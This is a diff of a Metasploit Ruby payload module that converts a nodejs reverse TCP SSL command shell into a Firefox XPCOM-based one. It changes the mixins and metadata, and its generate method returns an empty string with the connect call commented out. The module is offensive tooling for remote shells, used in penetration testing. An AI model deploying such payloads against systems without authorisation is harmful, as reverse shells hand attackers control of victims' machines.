@@ -4,7 +4,6 @@
 ##
 
 require 'msf/core'
-require 'msf/core/payload/nodejs'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -12,28 +11,26 @@ require 'msf/base/sessions/command_shell_options'
 module Metasploit3
 
   include Msf::Payload::Single
-  include Msf::Payload::NodeJS
+  include Msf::Payload::Firefox
   include Msf::Sessions::CommandShellOptions
 
-  def initialize(info = {})
+  def initialize(info={})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP SSL (via nodejs)',
-      'Description'   => 'Creates an interactive shell via nodejs, uses SSL',
-      'Author'        => ['RageLtMan', 'joev'],
+      'Name'          => 'Command Shell, Reverse TCP SSL (via Firefox XPCOM script)',
+      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
+      'Author'        => ['joev'],
       'License'       => BSD_LICENSE,
-      'Platform'      => 'nodejs',
-      'Arch'          => ARCH_NODEJS,
+      'Platform'      => 'firefox',
+      'Arch'          => ARCH_FIREFOX,
       'Handler'       => Msf::Handler::ReverseTcpSsl,
       'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'nodejs',
-      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
+      'PayloadType'   => 'firefox'
     ))
   end
 
-  #
-  # Returns the JS string to use for execution
-  #
-  def command_string
-    nodejs_reverse_tcp(:use_ssl => true)
+  def generate
+    # reverse_connect(:ssl => true)
+    ""
   end
+
 end
